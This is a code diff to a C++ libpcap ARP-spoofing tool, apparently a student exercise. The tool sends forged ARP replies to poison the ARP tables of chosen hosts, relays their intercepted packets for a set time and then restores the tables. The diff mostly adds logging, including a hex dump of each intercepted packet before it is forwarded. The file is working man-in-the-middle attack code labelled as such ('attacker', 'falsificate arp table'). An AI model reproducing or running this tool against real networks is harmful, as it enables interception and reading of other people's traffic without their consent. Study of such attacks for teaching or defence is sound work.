@@ -115,8 +115,23 @@ int sendArpReply(pcap_t* handle, Mac sourceMac, Ip sourceIp, Mac macMap,
                        sourceMac, htonl(sourceIp), macMap, htonl(targetIp));
 }
 
+void printPacketData(uint8_t* packet, uint16_t packetSize) {
+  for (int i = 0; packetSize > i; i++) {
+    printf("%02x ", packet[i]);
+    switch ((i + 1) % 16) {
+      case 0:
+        printf("\n");
+        break;
+      case 8:
+        printf(" ");
+        break;
+    }
+  }
+  printf("\n");
+}
+
 int main(int argc, char* argv[]) {
-  //assuagement verification
+  printf("=== assuagement verification ===\n");
   if (5 > argc || 0 != (argc - 1) % 2) {
     usage();
     return -1;
@@ -125,23 +140,30 @@ int main(int argc, char* argv[]) {
   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
 
-  //open network device
+  printf("\n");
+
+  printf("=== open network device ===\n");
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == nullptr) {
     printf("FATAL: Couldn't open device %s(%s)\n", dev, errbuf);
     return -1;
   }
 
-  //get attacker's mac address
-  Mac myMac = getMyMacAddress(dev);
-  //get attacker's ip address
+  printf("\n");
+
+  printf("=== get attacker's addresses ===\n");
   Ip myIp = getMyIpv4Address(dev);
+  Mac myMac = getMyMacAddress(dev);
+  printf("attacker: %s(%s)\n", std::string(myIp).c_str(),
+         std::string(myMac).c_str());
 
   map<Ip, Mac> macMap;
   Ip senderIp[(argc - 3) / 2];
   Ip targetIp[(argc - 3) / 2];
 
-  //get sender and target's ip addresses
+  printf("\n");
+
+  printf("=== get sender and target's addresses ===\n");
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     senderIp[i] = Ip(argv[2 + i * 2]);
     targetIp[i] = Ip(argv[3 + i * 2]);
@@ -155,7 +177,6 @@ int main(int argc, char* argv[]) {
 
   bool escapeFlag;
 
-  //get sender and target's mac address
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() == macMap.find(senderIp[i])) {
       escapeFlag = false;
@@ -275,14 +296,24 @@ int main(int argc, char* argv[]) {
     }
   }
 
-  //send arp packet to falsificate arp table
+  for (int i = 0; (argc - 3) / 2 > i; i++) {
+    printf("sender#%d %s(%s)\n", i, std::string(senderIp[i]).c_str(),
+           std::string(macMap.find(senderIp[i])->second).c_str());
+    printf("target#%d %s(%s)\n", i, std::string(targetIp[i]).c_str(),
+           std::string(macMap.find(targetIp[i])->second).c_str());
+    printf("\n");
+  }
+
+  printf("\n");
+
+  printf("=== send arp packet to falsificate arp table ===\n");
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       res = sendArpReply(handle, myMac, targetIp[i],
                          macMap.find(senderIp[i])->second, senderIp[i]);
-      printf("INFO: %d.%d.%d.%d's arp table has been falsified\n",
-             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
-             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
+      printf("INFO: %s's arp table has been falsified\n",
+             std::string(senderIp[i]).c_str());
+      printf("\n");
 
       if (res != 0) {
         printf("FATAL: pcap_sendpacket return %d error=%s\n", res,
@@ -290,14 +321,15 @@ int main(int argc, char* argv[]) {
         return -1;
       }
     } else {
-      printf("FATAL: cannot find mac address of %d.%d.%d.%d\n",
-             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
-             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
+      printf("FATAL: cannot find mac address of %s\n",
+             std::string(senderIp[i]).c_str());
       return -1;
     }
   }
 
-  //maintain falsificated arp table and relay packets
+  printf("\n");
+
+  printf("=== maintain falsificated arp table and relay packets ===\n");
   startTime = time(NULL);
   while (time(NULL) - startTime < durationTime) {
     struct pcap_pkthdr* header;
@@ -308,6 +340,7 @@ int main(int argc, char* argv[]) {
     if (res == -1 || res == -2) {
       printf("ERROR: pcap_next_ex return %d error=%s\n", res,
              pcap_geterr(handle));
+      printf("\n");
       break;
     }
 
@@ -324,32 +357,47 @@ int main(int argc, char* argv[]) {
         if (res != 0) {
           printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                  pcap_geterr(handle));
+          printf("\n");
           break;
         }
       } else if (ethernetHeader->smac() == macMap.find(senderIp[i])->second) {
-        memcpy((void*)packet, macMap.find(targetIp[i])->second, sizeof(Mac));
         switch (ethernetHeader->type()) {
           case EthHdr::Ip4:
-            packetSize = sizeof(EthHdr) + packet[16] * 0x0100 + packet[17] * 0x001;
+            packetSize =
+                sizeof(EthHdr) + packet[16] * 0x0100 + packet[17] * 0x001;
             break;
           case EthHdr::Ip6:
-            packetSize = sizeof(EthHdr) + packet[18] * 0x0100 + packet[19] * 0x001;
+            packetSize =
+                sizeof(EthHdr) + packet[18] * 0x0100 + packet[19] * 0x001;
             break;
           default:
-            printf("WARNING: unsupported type=0x%04x\n", ethernetHeader->type());
+            printf("WARNING: unsupported type=0x%04x\n",
+                   ethernetHeader->type());
+            printf("\n");
             continue;
         }
+
+        printf("sender#%d %s(%s)\n", i, std::string(senderIp[i]).c_str(),
+               std::string(macMap.find(senderIp[i])->second).c_str());
+        printPacketData((uint8_t*)packet, packetSize);
+        printf("\n");
+
+        memcpy((void*)packet, macMap.find(targetIp[i])->second, sizeof(Mac));
+
         res = pcap_sendpacket(handle, packet, packetSize);
         if (res != 0) {
           printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                  pcap_geterr(handle));
+          printf("\n");
           break;
         }
       }
     }
   }
 
-  //recover arp table
+  printf("\n");
+
+  printf("=== recover arp table ===\n");
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       for (int j = 0; 3 < j; j++) {
@@ -358,20 +406,23 @@ int main(int argc, char* argv[]) {
         if (res != 0) {
           printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                  pcap_geterr(handle));
+          printf("\n");
           continue;
         }
       }
-      printf("INFO: %d.%d.%d.%d's arp table has been normalized\n",
-             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
-             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
+      printf("INFO: %s's arp table has been normalized\n",
+             std::string(senderIp[i]).c_str());
+      printf("\n");
     } else {
-      printf("ERROR: cannot find mac address of %d.%d.%d.%d\n",
-             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
-             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
+      printf("ERROR: cannot find mac address of %s\n",
+             std::string(senderIp[i]).c_str());
+      printf("\n");
       continue;
     }
   }
 
-  //close network device
+  printf("\n");
+
+  printf("=== close network device ===\n");
   pcap_close(handle);
 }
